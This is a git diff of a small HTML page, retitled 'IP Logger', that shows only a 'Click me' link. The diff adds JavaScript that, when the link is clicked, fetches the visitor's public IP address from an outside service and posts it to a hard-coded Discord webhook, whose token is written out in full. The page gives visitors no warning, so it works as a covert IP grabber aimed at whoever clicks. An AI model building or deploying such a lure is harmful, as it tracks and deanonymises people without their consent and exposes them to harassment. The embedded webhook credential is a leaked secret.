@@ -3,10 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IG</title>
+    <title>IP Logger</title>
 </head>
 <body>
     <h1>Click the link</h1>
-    <a href="log_ip.php">Click me</a>
+    <a href="#" onclick="sendIP()">Click me</a>
+
+    <script>
+        function sendIP() {
+            // Get the IP address using an external API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const webhookURL = "https://discord.com/api/webhooks/1241024482894811218/0buUUaGvO9IqhnA4fI422Y5YYD6Yrur_wXD_tnavuMxbioo4EdjezBsTU-Tg-of1a8bg";
+                    const message = {
+                        content: `IP Address Logged: ${ip}`,
+                        username: "IP Logger"
+                    };
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(message)
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log("IP logged successfully.");
+                        } else {
+                            console.error("Failed to send IP address to Discord.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Error:", error);
+                    });
+                })
+                .catch(error => {
+                    console.error("Failed to get IP address:", error);
+                });
+        }
+    </script>
 </body>
 </html>
+
